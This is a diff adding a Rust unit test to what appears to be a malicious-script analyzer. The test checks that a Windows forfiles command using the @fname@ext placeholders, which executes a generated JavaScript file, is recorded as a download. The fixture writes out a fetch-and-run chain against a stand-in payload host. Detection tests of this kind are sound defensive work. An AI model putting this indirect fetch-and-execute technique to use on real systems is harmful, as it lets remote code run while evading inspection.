@@ -10703,6 +10703,22 @@ forfiles /p C:\Work /m *.js /c "cmd /c @path""#;
             );
         }
     }
+
+    #[test]
+    fn forfiles_name_and_ext_placeholders_feed_tracked_script_execution() {
+        let script = br#"echo fetch('https://forfiles-name-ext.example/payload') > C:\Work\run.js
+forfiles /p C:\Work /m *.js /c "cmd /c C:\Work\@fname@ext""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://forfiles-name-ext.example/payload")
+            }),
+            "forfiles @fname/@ext did not analyze generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
